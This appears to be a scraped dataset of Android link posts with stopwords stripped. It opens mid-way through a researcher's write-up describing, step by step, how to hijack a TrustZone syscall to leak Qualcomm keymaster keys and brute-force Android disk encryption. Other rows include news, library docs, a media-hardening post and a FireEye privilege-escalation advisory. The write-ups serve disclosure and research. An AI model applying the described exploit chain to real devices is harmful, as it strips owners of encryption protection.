dosomethingwithkeyblob immediately calling function signature calculated written destination buffer however previously seen private exponent encrypted key blob obviously rsa signature calculated private exponent decrypted dosomethingwithkeyblob let see aha suspected function dosomethingwithkeyblob simply decrypts private exponent using encryption key finally let take look function used retrieve hmac encryption key bearing appropriate name see code hmac key encryption key generated using kind key derivation function key generated invoking kdf using pair hardcoded string input resulting derived key stored keymaster application global buffer pointer key returned caller moreover trust provided string internal key derivation function us actual hardware key called shk would doubt hard extract using software irrelevant decapsulation code reverseengineered revealed important fact instead creating scheme directly us hardware key without ever divulging software firmware code performs encryption validation key blob using key directly available trustzone software note key also constant directly derived shk fused hardware two hardcoded string let take moment explore implication finding conclusion key derivation hardware bound instead using real hardware key extracted software example shk keymaster application us key derived shk directly available trustzone oems comply law enforcement break full disk encryption since key available trustzone oems could simply create sign trustzone image extract keymaster key flash target device would allow law enforcement easily bruteforce fde password device using leaked key patching trustzone vulnerability necessarily protect issue even patched device attacker obtain encrypted disk image eg using forensic tool downgrade device vulnerable version extract key exploiting trustzone use bruteforce encryption since key derived directly shk shk modified render downgradable device directly vulnerable android fde strong trustzone kernel keymaster finding trustzone kernel vulnerability vulnerability keymaster trustlet directly lead disclosure keymaster key thus enabling offdevice attack android fde communication qualcomm voiced concern usage softwareaccessible key derived shk suggested using shk another hardware key directly far know shk extracted software available cryptographic processor similarly apple uid therefore using would thwart attempt offdevice brute force attack barring use specialized hardware extract key however reality simple shk used many different purpose allowing user directly encrypt data using shk would compromise usecases keymaster application widely used android operatingsystem modifying behaviour could break application rely lastly current design keymaster application nt differentiate request use keymaster application android fde request different usecases make harder incorporate fix modifies keymaster application regardless believe issue underscore need solution entangles full disk encryption key device hardware way bypassed using software perhaps mean redesigning fde kdf perhaps addressed using additional hardware think something google oems definitely get together think extracting keymaster key set sight keymaster key still left challenge extracting key directly trustzone previously zerototrustzone series blog post discovered exploit allowed u achieve codeexecution within qsee namely within widevine drm application however enough perhaps could read key directly keymaster trustlet memory context hijacked widevine trustlet unfortunately answer attempt access different qsee application memory cause xpu violation subsequently crash violating trustlet even switching kernel context calling kdf used keymaster module generate key context widevine trustlet unfortunately answer kdf present keymaster application code segment qsee application modify code allocate new executable page luckily also previously discovered additional privilege escalation qsee trustzone kernel surely code execution within trustzone kernel would allow u hijack qsee application control keymaster application simply use leak hmac encryption key call day recall previous blog post reverseengineered mechanism behind invocation system call trustzone kernel revealed systemcalls invoked indirectly using set globallystored pointer pointing different table supported systemcalls systemcall table simply contained bunch consecutive entry value representing syscall number followed pointer syscall handler function one table since table used qsee trustlets could serve highly convenient entry point order hijack code execution within keymaster application would need overwrite systemcall handler entry table point function keymaster application invokes target systemcall would execute handler instead original one also enables u worry restoring execution executing code nice added bonus tiny snag order direct handler function need way allocate chunk code globally available secure world mentioned different qsee application access memory segment render previous method overwriting code segment widevine application useless case however seen past trustzone kernel code segment accessible qsee application executing kernel context protected using special hardware component called xpu therefore even running within trustzone kernel disabling access protection fault arm mmu still unable modify bruteforce come handy written small snippet code quickly iterates trustzone kernel code segment attempt modify mistakenly xpuunprotected region surely find indeed iterating code segment one rather large segment ranging address appeared unprotected since nt want disrupt regular operation trustzone kernel would wise find small codecave region small chunk code would harmless overwrite searching around bit reveals small bunch logging string segment surely overwrite without adverse effect modifiable code cave trustzone kernel proceed write small stub called exfiltrate keymaster key directly keymaster trustlet memory lastly need simple way cause keymaster application execute hijacked systemcall remember easily send command keymaster application turn cause keymaster application call quite systemcalls reviewing keymaster keygeneration command reveals one good candidate hijack would qseehmac systemcall keymaster generate key flow qseehmac signature good candidate reason data argument passed buffer shared nonsecure world mean whatever write easily retrieved returning secure world qseehmac function called often hijacking couple second would probably harmless function receives address hmac key one argument save u need find keymaster application address dynamically calculate address key memory finally shellcode would read hmac encryption key keymaster application global buffer location saw earlier leak shared buffer returning command request could simply fishout leaked key shared buffer small snippet thumb assembly shellcode leak keymaster key putting together finally piece puzzle need order extract keymaster key enable dacr trustzone kernel allow u modify code cave write small shellcode stub code cave read key keymaster application hijack qseehmac systemcall point shellcode stub call keymaster keygeneration command causing trigger poisoned systemcall exfiltrate key shared buffer read leaked key shared buffer diagram detailing step code finally always provided full source code attack described code build upon two previously disclosed issue zerototrustzone series allows leak keymaster key directly device successfully executing exploit keymaster key printed console like find full source code exploit http githubcomlaginimainebextractkeymaster also written set python script used bruteforce android full disk encryption device find script http githubcomlaginimainebandroidfdebruteforce simply invoke python script fdebruteforcepy using crypto footer device leaked keymaster key wordlist containing possible password currently script simply enumerates password given wordlist attempt match encryption result scrypted intermediate key stored crypto footer pass word wordlist android fde kdf scrypts result compare value stored crypto footer since implementation fully python rather slow however seeking speed could port much faster platform hashcatoclhashcat look like running nexus encrypted using password secret lastly also written script used decrypt alreadygenerated keymaster key blob simply keymaster key blob like decrypt using leaked key invoking script kmkeymasterpy like final thought full disk encryption used worldwide sometimes instrumental ensuring privacy people intimate piece information believe encryption scheme designed bulletproof possible type adversary seen current encryption scheme far bulletproof hacked adversary even broken oems coerced comply law enforcement hope shedding light subject research motivate oems google come together think robust solution fde realise android ecosystem harder guarantee due multitude oems however believe concentrated effort side help next generation android device truly uncrackable
362,Lobsters,android,Android,We built the mobile app that health workers deserve,http://medicmobile.org/blog/we-built-the-mobile-app-health-workers-deserve,built mobile app health worker deserve,work perspective health worker task contact action target partnering living good living good replicated multiple country excited compelling case enketo form engine happening next open source,health worker said want pull phone plan going see make sure nt miss anything listened product team hard work building new android app designed community health worker six month design development moving sketch paper prototype focus group functioning app approaching first deployment excited share building frontline health worker provide care neighbor critical time also serve proactive agent change community believe health worker deserve amazing technology work medic mobile android designed new wave community health worker integrated health system new app provides automated prioritized list upcoming task app community health worker guided action screening highrisk pregnancy diagnosing providing treatment child also show progress towards goal allows remote health worker communicate contact central support team work perspective health worker task home screen smart task list directs people need help provides information patient family due date task stepbystep guide action contact app organizes information based people relationship contact list searchable let quickly access family person profile profile display key information people upcoming task available action history thing done past also call text contact straight app action health worker provide array service community app guide different action registering new pregnancy screening danger sign assessing childhood illness providing treatment form include image video decision support logic result screen next step something logged app automatically uploaded central location target app show progress making towards target care meeting goal work know manager reviewing visualization partnering living good incredibly fortunate partner living good new product past year worked sidebyside living good team community health promoter uganda identify important feature design test user experience user interface configure application initial deployment uganda living good app support highimpact model replicated multiple country shared vision broad reach app designed flexibility accommodate new context device content logic excited cost smartphones mobile data continue drop community health worker chw program becoming professionalized compelling case training equipping managing paying incentivizing chws medic mobile partner saw opportunity put powerful tool hand decentralized communitybased health worker chws unique knowledge community ability provide care service reach people set build intuitive personcentered app worked community smart way time move beyond data collection medic mobile android offline web app android container delivering benefit web native app data every mobile user replicated medic mobile hosted web app analytics tool providing access clinic team manager able build quickly using existing tool extending medic mobile web app mobile embedded enketo form engine allow flexible easytoconfigure action form hood updated user background addition used nools rule engine power smart task happening next field test living good app uganda launching soon share learning initial group chps job harness full power web lowcost smartphones management strategy support frontline health worker beginning unlock potential new application medic mobile tool free open source welcome question idea collaboration
363,Lobsters,android,Android,Android Photo Filters by Zomato,https://github.com/Zomato/AndroidPhotoFilters,android photo filter zomato,photofilterssdk feature samplefitlersjava implementation adding dependency usage example project documentation tonecurvesubfilter photofilterssdk saturationsubfilter coloroverlaysubfilter contrastsubfilter brightnesssubfilter vignettesubfilter proguard license apache,photofilterssdk photofilterssdk aim provide fast powerful flexible image processing instrument creating awesome effect image medium library support o api feature photofilterssdk process filter image within fraction second since processing logic ndk present following image filter included library also come inbuilt sample filter refer samplefitlersjava implementation straightforward filter foofilter samplefiltersgetbluemessfilter bitmap outputimage foofilterprocessfilter inputimage implementation adding dependency simply add dependency artifact buildgradle dependency compile comgithubzomato copypaste photofilterssdk repo project include photofiltersdk settingsgradle like include photofilterssdk add dependency buildgradle compile project photofilterssdk usage load native library activity public class mainactivity extends appcompatactivity static systemloadlibrary nativeimageprocessor filter myfilter new filter myfilteraddsubfilter new brightnesssubfilter myfilteraddsubfilter new contrastsubfilter bitmap outputimage myfilterprocessfilter inputimage code snippet give outputimage increased brightness contrast refer example project documentation although inbuilt filter already present may want create customize one specific need show creativity would require know subfilters used let take tonecurvesubfilter awesome filter present library differentiates photofilterssdk image processing library tonecurvesubfilter applies changed rgb channel curve create effect image code snippet apply rgb curve image filter myfilter new filter point rgbknots rgbknots new point rgbknots new point rgbknots new point rgbknots new point myfilteraddsubfilter new tonecurvesubfilter rgbknots null null null bitmap outputimage myfilterprocessfilter inputimage result nearly would see photoshop tool also specify knot red green blue channel tonecurvesubfilter constructor saturationsubfilter fitler used tweak color saturation image example filter myfilter new filter myfilteraddsubfilter new saturationsubfilter bitmap outputimage myfilterprocessfilter inputimage saturationsubfilter take float argument effect value coloroverlaysubfilter increase specified red green blue value pixel image filter myfilter new filter myfilteraddsubfilter new coloroverlaysubfilter bitmap outputimage myfilterprocessfilter inputimage contrastsubfilter change contrast level image use filter filter myfilter new filter myfilteraddsubfilter new contrastsubfilter bitmap outputimage myfilterprocessfilter inputimage contrastsubfilter take float argument value effect image brightnesssubfilter name suggest filter used changing brightness level filter myfilter new filter myfilteraddsubfilter new brightnesssubfilter bitmap ouputimage myfilterprocessfilter inputimage brightnesssubfilter take int argument value effect negative value used decrease brightness image vignettesubfilter filter used put vignette effect image filter myfilter new filter myfilteraddsubfilter new vignettesubfilter context bitmap outputimage myfilterprocessfilter inputimage vignettesubfilter take int argument whoes value range defines intesity vignette effect proguard using proguard consider adding following proguard rule keep class comzomatophotofilters keepclassmembers class comzomatophotofilters license library fall apache
364,Lobsters,android,Android,"A look back at Sooner, Google's first Android phone (2015)",http://www.androidcentral.com/look-back-google-sooner-first-android-phone,look back sooner google first android phone,htc tmobile tmobile htc dream read android history,android operating system changed dramatically since first acquired google along phone hardware run every android fan know tmobile aka htc dream first androidpowered phone made available consumer milestone sooner sooner google andy rubin first vision android phone would built engineering prototype testing first build consumerfacing android conjunction htc starting come tmobile got board testing partner plain see sooner followed thenmodern idea smartphone look like blocky design small nontouch screen dedicated calling key menubackhome navigational button big focus communication screen resolution whopping ram offered gprs data connection yes camera removable battery even sd card slot even though sooner hardware finalized software regularly flux even sooner hardware finalized software remained regularly flux google trying new thing android trying figure worked best full experience sooner though o hardly recognizable even compared like android jelly bean lot tentpole feature unified notification center google talk google search full web browser youtube gmail google map ran sooner fact able pop sim sooner watch still run today receiving text message making search google checking calendar entry back google saw smartphone world start turn android development continued sooner never slated consumer launch sooner still pocket android engineer development already well way tmobile htc dream know dramatically advanced device sooner android moved touchfirst interface though kept keyboard available internal component improved significantly time sooner tip android iceberg tmobile de smith remembers sooner key milestone android transition idea physical product time great excitement u smith said sooner tip android iceberg first thing seen android running sooner android idea concept first physical example android world even though still secret sooner never meant public viewing saw knew android real would come rest world though nt slated public consumption sooner incredibly important device development android lesson learned sooner dream helped kickstart android global operating system used billion device today read android history
365,Lobsters,android,Android,"Ways to think about Android Instant Apps, and what it means for developers",http://williamgill.de/2016/05/21/ways-to-think-about-android-instant-apps-and-what-it-means-for-developers/,way think android instant apps mean developer,chris maddern one thing moment way instant apps help app developer app linking smoother involve le friction branchio button allowing easy access rich native experience real world location preview app without installing even need mobileoptimised website accelerated mobile page instant apps necessarily help app discovery thing developer think android developer portal,week annual developer event google casually announced huge new feature coming soon android instant apps chris maddern called one thing moment finally released perhaps later year could one fundamental change way mobile apps work since app store however instant solution majority app developer main problem app discovery let unpack bit android instant apps presented keynote allow android native apps run immediately without installed essentially lazyloading relevant module device runtime allow user interact app content immediately without needing go hurdle visiting app store user presumably install full app want easy see big deal mechanic installing app involve lot physical psychological friction really want app phone trust ever use time wait download install even space anyone iphone attest real constant problem apps could lose anywhere traffic hit app store page anything help eliminate friction huge win app developer get even interesting android pay according keynote instant apps able integrate android pay assume give app instant access payment detail identity shipping detail well could easily imagine purchasing something discovered web instant app couple tap way instant apps help app developer app linking smoother involve le friction android io allowed native app deep linking couple o version allowing developer link deep content view within apps generally work great user target app already installed device experience great user generally redirected either mobileoptimised version target product usually presented mobile app upsell ad directed straight app store user need first figure kind app care enough install etc sloppy appinstall experience app link company trying improve process branchio built tool allow developer use deferred deep link user install app tapping deep link directed straight piece content looking directly install still heap go wrong user need tap install wait installation finish open although deferred deep link help bandaid essentially sloppy user experience instant apps solve skipping whole store toinstallornottoinstall question expect see developer engaging app linking partnership leveraging partnership monetise user also grow seeking partner send incoming link nycbased startup button building exciting business around facilitating network deeplinkbased affiliate partnership sdk also tried solve part appinstall problem bringing content publishing app allowing easy access rich native experience real world location lot brand store apps already suffer app install friction described might really handy able place mcdonalds order advance mcdonalds app going mcdonalds one time bother downloading app signing adding payment detail etc instant apps would allow business like mcdonalds allow customer place order pay quickly easily without needing download anything example google used keynote paying parking without needing install app importantly without even needing know app need point phone parking meter via nfc connection figure app need lazyload needed module connect android pay boom paid parking safely securely perhaps new city want buy ticket subway idea system work city point phone ticket machine appropriate experience book pay ticket pop right phone given ease linking rich experience allows could imagine noncommerce use case imagine yelp issue business qr code sitting restaurant great meal could scan code go directly yelppowered experience leave review without needing yelp app installed phone instant apps allow user access user identity even need create account yelp either preview app without installing interesting see google build instant app mechanism play store directly could allow quickly preview app make decision install screenshots description video great nothing beat actually using app could preview working version install instant apppowered trial version could become next frontier app store optimisation enabled free limited trial paid apps choosing drop newest distractionfree text editor could trial could also great game like shareware app economy even need mobileoptimised website take logical conclusion start wonder need mobile website ok least androidoptimised mobile website day plenty business hotel tonight mobileonly day one many others web particularly mobile web remains important discovery conversion channel contentbased business particularly important mobile website deal app installed dilemma described somebody discovers content either seo link another service want able show user content immediately risk sending directly app store hoping convert downloading app android instant apps provide real native experience immediately without downloading app would need mobile website would shift seo focus concentrating googlefirebase app indexing shift conversion funnel instant app experience interesting internal conflict google one hand google inviting developer prioritise native app experience followed logical conclusion might well result le investment web time google control monetisation still heavily dependent people searching discovering stuff google search one rationale invest accelerated mobile page project instant apps necessarily help app discovery instant apps could make entire conversion experience apps much seamless making easier access consume potentially testtrial apps conversion half app distribution problem second half first half problem app discovery see instant apps helping much least directly instant apps make smoother link apps could hopefully encourage stronger ecosystem app uservalue exchange help app discovery sure majority apps still discovered traditional way word mouth content search app store browsing performancedigital marketing instant apps large let developer circumvent traditional app discovery channel still need get app front user dramatically simplifies conversion process allowing user interact app discover value discovered thing developer think instant apps mean thing think content commercebased business start thinking expand reach affiliate partnership building instant apps make consuming content service via referred link partner app much easier powerful source acquisition else include link could surface deep view service without needing install marketing material affiliate program start thinking modularise codebase apps easy google say apps able make necessary change within day apps depending architecture complicated try signing early access program android developer portal even get start thinking approach modularisation big architecture refactor need invest
366,Lobsters,android,Android,Node.js module for App Store Optimization on Google Play,https://github.com/facundoolano/google-play-keywords,nodejs module app store optimization google play,app store optimization aso app store optimization googleplayscraper appstorescraper installation api reference keyword score difficulty traffic keyword suggestion suggestion category suggestion similarity suggestion competition suggestion arbitrary list apps suggestion based seed keywords suggestion based search hint app visibility score app keywords retextkeywords note keyword relevancy itunes store backend configuration googleplayscraper appstorescraper note google play performance,app store optimization aso nodejs library provides set function aid app store optimization application itunes google play function use either googleplayscraper appstorescraper gather data bear mind lot request performed hood may hit throttling limit making many call short period time installation npm install aso api reference module export function build client query either itunes itunes google play gplay const gplay require aso gplay const itunes require aso itunes stuff google play gplayscores panda consolelog stuff itunes itunesscores panda consolelog behaviour algorithm store except noted keyword score score function gather several statistic keyword build difficulty traffic score used evaluate convenience targeting keyword argument keyword const aso require aso gplay asoscores panda consolelog return difficulty titlematches exact broad partial none score competitor count score installs avg score rating avg score age avgdayssinceupdated score score traffic suggest length index score ranked count avgrank score installs avg score length length score score score calculated linear function aggregated somewhat arbitrary weight statistic included response allow custom scoring function used suggestion tune improve score calculation welcome difficulty difficulty keyword measure hard rank high search kewyord usually important aspect consider picking keyword relevance keyword given app lower score better candidate keyword property considered score titlematches classifies title top apps keyword according well match word make exact contains word order broad contains word different order partial contains word none contain word competitor count many top apps keyword actually target keyword title description installs measure average amount installs top apps since itunes expose amount installs review count used instead rating measure average rating top apps age measure average time since apps top updated traffic traffic score estimate much traffic keyword get note factor better considered picking keywords high relevance low difficulty high score mean high traffic therefore better keyword candidate property considered score suggest google play amount character needed keyword come suggestion search box position suggestion list itunes already score suggest result number used instead ranked amount apps top keyword appear category ranking average ranking installs metric difficulty lower weight overall score length length keyword le traffic assumed longer keywords keyword suggestion suggest function return list suggestion consisting commonly used keywords among given set apps several strategy select set apps function take option object following property strategy strategy used get suggestion default category num amount suggestion get result default appid store app id itunes numerical bundle id supported required category similar competition strategy apps array store app id required arbitrary strategy keywords array seed keywords required keywords search strategy common flow work would try strategy given app hand pick interesting keywords run score function analize quality suggestion category look apps category one given const aso require aso gplay asosuggest strategy asocategory appid comdxcopandavszombies num consolelog return game world feature weapon action suggestion similarity look apps marked google play similar itunes customer also bought apps used instead may necessarily similar given app const aso require aso gplay asosuggest strategy asosimilar appid comdxcopandavszombies num consolelog return game zombie zombie weapon action suggestion competition look apps target keywords one given const aso require aso gplay asosuggest strategy asocompetition appid comdxcopandavszombies num consolelog return game zombie feature app zombie suggestion arbitrary list apps const aso require aso gplay asosuggest strategy asoarbitrary apps comdxcopandavszombies num consolelog return game zombie feature app zombie suggestion based seed keywords look apps target one given seed keywords const aso require aso gplay asosuggest strategy asokeywords keywords panda zombie horde num consolelog return feature game zombie panda zombie suggestion based search hint given set seed keywords infer new set search completion suggestion one look apps target resulting keywords expected work better itunes search completion yield result const aso require aso gplay asosuggest strategy asosearch keywords panda zombie horde num consolelog return game feature zombie zombie way app visibility score visibility function give estimation app discoverability within store score built aggregating well app rank target keywords traffic score keywords app rank top global category ranking argument function app id package id google play either numerical bundle id itunes google play example const aso require aso gplay asovisibility comdxcopandavszombies consolelog return keywords panda v zombie traffic rank score rocky traffic rank score panda v zombie traffic rank score panda warrior traffic rank score zombie elvis traffic rank score meatloaf traffic rank score ftw traffic rank score collection global rank undefined score category rank undefined score score itunes example const aso require aso gplay asovisibility id facebook app consolelog return keywords facebook traffic rank score friend traffic rank score collection global rank score category rank score score app keywords app function return array keywords extracted title description app argument google play id application id parameter url const aso require aso gplay asoapp comdxcopandavszombies consolelog return panda rocky zombie panda v zombie elvis undead time game v retextkeywords used extract keywords app title description note keyword relevancy itunes said algorithm used app function extract keywords title description algorithm also used internally score suggest function case important place look keywords title app description usually le relevant itunes app store since specific keywords list field submitting app unfortunately content field know reachable public page api keywords based description may big weight itunes search google play hand nt keywords field description expected contain app targeted keywords store backend configuration object passed second argument client builder function option override behavior googleplayscraper appstorescraper given option included every method call store used example target differnt country default u const itunesrussia require aso itunes country ru stuff itunes itunesrussiascores panda consolelog option may useful cache throttle see reference scraper available option note google play performance itunes provides api search apps detail getting data google play usually requires making request search additional request get detail resulting app parsing html mean function module specially score much slower google play itunes taking even minute expected given data scraped google play real time every call partially mitigated using memoization expense memory usage better approach outside scope project get faster result would periodically scan google play save data database query score calculation
368,Lobsters,android,Android,The verdict is in: Android is “fair use” as Google beats Oracle,http://arstechnica.com/tech-policy/2016/05/google-wins-trial-against-oracle-as-jury-finds-android-is-fair-use/,verdict android fair use google beat oracle,oracle argued said closing argument told jury,san twoweek trial federal jury concluded thursday google android operating system infringe oracleowned copyright reimplementation java apis protected fair use verdict reached three day deliberation lady gentleman jury listen verdict stand recorded said court clerk polling ten men woman jury one question special verdict form asking google use java apis fair use copyright law jury unanimously answered yes google favor verdict end trial began earlier month oracle jury would gone damage phase determine much google pay google trial salute extreme hard work case said u district judge william alsup overseen litigation since thanks united state district court discharged would like come jury room shake hand individually four ten juror declined comment reporter gathered hallway six went back exit grateful jury verdict said google lead lawyer robert van nest getting elevator google inhouse lawyer oracle attorney comment google said statement victory good everybody today verdict android make fair use java apis represents win android ecosystem java programming community software developer rely open free programming language build innovative consumer product google spokesperson said via email oracle however vowed appeal strongly believe google developed android illegally copying core java technology rush mobile device market oracle brought lawsuit put stop google illegal behavior believe numerous ground appeal plan bring case back federal circuit appeal dorian daley oracle general counsel said statement google win somewhat softens blow software developer previously thought programming language apis free use still case apis protected copyright law least one appeal court however first highprofile attempt control apis copyright law stymied fair use defense nt clear much oracle would asked damage phase could much billion much oracle asked early expert report course twoweek trial juror heard testimony current former ceo sun microsystems google oracle well inthetrenches programmer computer expert company oracle acquired java purchased sun microsystems sued google apis following first jury trial u district judge william alsup ruled apis cant copyrighted alsup opinion overturned appeal month trial google available argument apis constituted fair use trial oracle argued google copied part java api package well related declaring code order take shortcut oracle expense android prospered oracle java licensing business centered largely around featurephones cratered copied line code oracle attorney peter bicks said closing argument undisputed took code copied put right android google countered java language always free open included reimplementing java apis sun ceo jonathan schwartz accepted android legitimate inconvenient competitive product oracle ceo larry ellison welcomed android first later changed mind tried use java build smartphone failed google attorney robert van nest told jury oracle v google trial
369,Lobsters,android,Android,Google aims to kill passwords by the end of this year,https://www.theguardian.com/technology/2016/may/24/google-passwords-android,google aim kill password end year,google android google showed trust api built project abacus base nok nok lab,google begin testing alternative password next month move could away complicated logins good new feature introduced developer company io conference called trust api initially tested several large financial institution june according google daniel kaufman kaufman head google advanced technology project group trust api first created codename project abacus introduced last year abacus aim kill password one supersecure replacement mixing together multiple weaker indicator one solid piece evidence say among piece evidence google suggests trust api could use obvious biometric indicator face shape voice pattern well le obvious one move type swipe screen service continually running background phone keep track whether indicator match know use phone individually would ludicrous use method secure web service even facial recognition built many android phone significantly le secure fingerprint scanner according google metric combining company suggests result something time secure fingerprint year google showed trust api built project abacus base service open third party allowing organisation identity api initially bank use verify customer logging android end year available every developer crucial api opening service estimate security rather giving binary answer password api hand score indicate confident really institution need confidence feed back ask additional mechanism biometric data instance oldstyle password google organisation working plan londonbased nok nok lab similar proposal place linking information manufacturer mobile network user together web trust richard lack customer identity management firm gigya say approach like google likely pay consumer tell u struggling remember average password europe time number device rising sharply frustration relegated registration process broken thing internet future lie method authentication without password consumer clearly favour term convenience enhanced security biometric authentication powerful enabler allowing business smart enough deploy significantly increase rate registration gaining data insight customer also increasing customer security winwin scenario sound deathknell awkward insecure password sooner may imagine google declined comment
370,Lobsters,android,Android,Google I/O 2016,https://live.theverge.com/google-io-2016-live-blog-android-n-vr-keynote/,google io,processor,sign newsletter processor newsletter computer
371,Lobsters,android,Android,Hardening the media stack,http://android-developers.blogspot.com/2016/05/hardening-media-stack.html,hardening medium stack,reward security bulletin prevention containment prevention integer overflow ubsan project zero figure figure containment figure selinux seccomp conclusion security androidcom,posted dan austin jeff vander stoep android security team help make android secure encourage reward researcher discover vulnerability series bug mediaserver libstagefright disclosed google released update issue august september security bulletin addition addressing issue monthly basis also working new security feature designed enhance existing security model provide additional defense indepth defense measure attempt achieve two goal prevention stop bug becoming vulnerability containment protect system deprivileging isolating component handle untrusted content prevention vulnerability found libstagefright heap overflow resulting unsigned integer overflow number integer overflow libstagefright allowed attacker allocate buffer le space necessary incoming data resulting buffer overflow heap result unsigned integer overflow well defined ensuing behavior could unexpected unsafe contrast signed integer overflow considered undefined behavior cc mean result overflow guaranteed compiler author may choose resulting fastest simplest added compiler change designed provide safer default signed unsigned integer overflow undefinedbehaviorsanitizer ubsan part llvmclang compiler toolchain detects undefined unintended behavior ubsan check multiple type undefined unsafe behavior including signed unsigned integer overflow check add code resulting executable testing integer overflow condition runtime example figure show source code parsechunk function component libstagefright original researchersupplied patch applied modification contained black box appears prevent integer overflow occurring unfortunately sizemax size value chunksize value resulting incomplete check potential integer overflow line within red box addition size chunksize may result integer overflow creation buffer smaller size element subsequent memcpy could lead exploitable memory corruption size chunksize could le size highlighted blue box mechanic potential exploit vector vulnerability explained detail project zero figure source code demonstrating subtle unsigned integer overflow figure compare assembly generated code segment second version compiled integer sanitization enabled add operation result integer overflow contained red box unsanitized version size chunksize added together potentially resulting overflowing le size buffer allocated size specified size byte copied le result memory corruption sanitized version size chunksize added together result stored later checked le indicated cc condition code set carry bit set integer overflow occurred abort triggered preventing memory corruption note incomplete check provided patch included figure overflow occurs buffer allocation add operation addition trigger integer sanitization check turn exploitable flaw harmless abort figure comparing unsanitized sanitized compiler output integer sanitizers originally intended code hygiene tool effectively prevent majority reported libstagefright vulnerability turning integer overflow check first step preventing runtime abort finding fixing integer overflow exploitable represented large effort android medium team discovered overflow fixed remain mostly performance reason verified marked safe prevent runtime abort android n signed unsigned integer overflow detection enabled entire medium stack including libstagefright make harder exploit integer overflow also help prevent future addition android introducing new integer overflow bug containment android earlier mediaserver process android responsible mediarelated task meant required access permission needed responsibility although mediaserver ran sandbox still access lot resource capability libstagefright bug could access several important resource android device including camera microphone graphic phone bluetooth internet root cause analysis showed libstagefright bug primarily occurred code responsible parsing file format medium codecs complex file format codecs trying optimize speed hard large number edge case make code susceptible accidental malicious malformed input however medium parser require access privileged permission held mediaserver medium team rearchitected mediaserver android n better adhere principle least privilege figure illustrates monolithic mediaserver permission divided using following heuristic parsing code moved unprivileged sandbox permission component require sensitive permission moved separate sandbox grant access specific resource component need example cameraserver may access camera audioserver may access bluetooth drmserver may access drm resource figure mediaserver permission divided android n comparing potential impact libstagefright bug android n older version demonstrates value strategy gaining code execution libstagefright previously granted access permission resource available monolithic mediaserver process including graphic driver camera driver socket present rich kernel attack surface android n libstagefright run within mediacodec sandbox access permission access camera microphone photo phone bluetooth internet well dynamic code loading disallowed selinux interaction kernel restricted seccomp mean compromising libstagefright would grant attacker access significantly fewer permission also mitigates privilege escalation reducing attack surface exposed kernel conclusion medium hardening project ongoing effort focused moving functionality le privileged sandbox reducing permission granted sandbox technique discussed applied android medium framework suitable across android codebase hardening actively applied additional component within android always appreciate feedback work welcome suggestion improve android contact u security androidcom
372,Lobsters,android,Android,Google Translate Works Offline (guess the size of the translate-English-to-Hindi file),https://googleblog.blogspot.com/2016/05/translate-where-you-need-it-in-any-app.html,google translate work offline guess size translateenglishtohindi file,total number offline language simplified traditional chinese,offline mode easy set tap arrow next language name download package language ready text translation whether online work tap translate added filipino language pack bringing total number offline language adding word lens chinese language instant visual translation read english simplified traditional chinese try menu sign package printed text word lens language work offline
373,Lobsters,android,Android,Sarah Jeong live tweeting from the Oracle v. Google trial,https://twitter.com/sarahjeong,sarah jeong live tweeting oracle v google trial,,detected javascript disabled browser would like proceed legacy twitter yes
374,Lobsters,android,Android,Embedded Linux Conference 2013 - Toybox: Writing a New Command Line From Scratch,https://www.youtube.com/watch?v=SGmtP5Lg_t0,embedded linux conference toybox writing new command line scratch,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature embedded linux conference toybox writing new command line scratch youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature embedded linux conference toybox writing new command line scratch youtube
376,Lobsters,android,Android,Jury is picked for $9 billion Oracle v. Google showdown,http://arstechnica.com/tech-policy/2016/05/jury-is-picked-for-9-billion-oracle-v-google-showdown/,jury picked billion oracle v google showdown,narrowing pool,san jury ten men woman selected second oracle v google copyright trial opening statement heard tomorrow morning trial expected last month oracle win damage could billion jury includes employment coordinator lawyer work local government former aerospace cfo hr professional electrician retiree homemaker product manager local power company panel selected hour questioning running list basic information like name city residence education marital family information lawyer side allowed dive specific juror unaware case juror used google product said feeling product nt strong enough influence decisionmaking several use phone running android upcoming trial second time oracle faced court google copyright android mobile operating system oracle sued saying using declaring code java apis google broke copyright law initial trial concluded u district judge william alsup ruled apis ca nt copyrighted however u court appeal federal circuit overruled second trial beginning google defense copyright infringement claim fair use argument narrowing pool one potential juror direct experience computer networking manager lawrence berkeley laboratory hold computer science degree uc berkeley made small donation eff year nt familiar group knew acronym stand electronic frontier foundation juror familiar term fair use come universitywide email side given three chance strike juror networking manager oracle first strike google struck juror said objected idea free software juror dismissed close relative owned stock one company one woman dismissed husband trying sell patent oracle google prospective buyer several people dismissed hardship scheduling conflict nt believe could impartial potential juror college student said nt think could resist temptation internet search information case propaganda internet way said alsup dismissing student half nt know talking look would travesty justice another potential juror questioned gave pamphlet church another person hall break warned judge would nt able proselytize trial juror responded nt able abide serve higher authority said man judge higher may far nt communicated said alsup juror dismissed
377,Lobsters,android,Android,Exploiting CVE-2016-2060 on Qualcomm Devices,https://www.fireeye.com/blog/threat-research/2016/05/exploiting_cve-2016-.html,exploiting qualcomm device,security advisory may android security bulletin observed git repository regular bound service stackoverflow smsmanager class java source binder interface android interface definition language aidl aidl source reviewed exploring logcat utility accessnetworkstate phone application telephony provider application seandroid consideration netd context conclusion,mandiant red team recently discovered widespread vulnerability affecting android device permit local privilege escalation builtin user radio making attacker potentially perform activity viewing victim sm database phone history vulnerability exists software package maintained qualcomm available code aurora forum published security advisory code aurora forum provided general detail faq technical analysis vulnerability follows faq lack input sanitization interface parameter netd daemon daemon part android open source project aosp vulnerability introduced qualcomm provided new apis part networkmanager system service subsequently netd daemon allow additional tethering capability possibly among thing qualcomm modified netd daemon many device affected solid answer since many flagship nonflagship device use qualcomm chip andor qualcomm code possible hundred model affected across last five year provide api number android gingerbread released vulnerability confirmed device running lollipop kitkat jellybean git commit referenced post ice cream sandwich issue addressed qualcomm addressed issue patching netd daemon qualcomm notified customer oems early march oems need provide update device however many device likely never patched fireeye reached qualcomm january subsequently worked qualcomm product security team coordinate blog release security advisory contacted fireeye qualcomm extremely responsive throughout entire process fixed issue within day window set fireeye fireeye would like thank qualcomm cooperation throughout disclosure diligence addressing issue google included issue may android security bulletin would attacker exploit vulnerability two way exploit vulnerability though account determined attacker posse additional vulnerability first physical access unlocked device second user install malicious application device application could interact api without triggering alert google play likely flag malicious fireeye mobile threat prevention mtp initially detect hard believe antivirus would flag threat additionally permission required perform requested million application would nt tip user something wrong could attacker successfully exploit vulnerability older device malicious application extract sm database phone call database access internet perform capability allowed radio user example potential capability radio user presented blog though difficult tested newer device affected le malicious application modify additional system property maintained operating system impact depends entirely oem using system property subsystem noted vulnerability exploited indication user something happened example 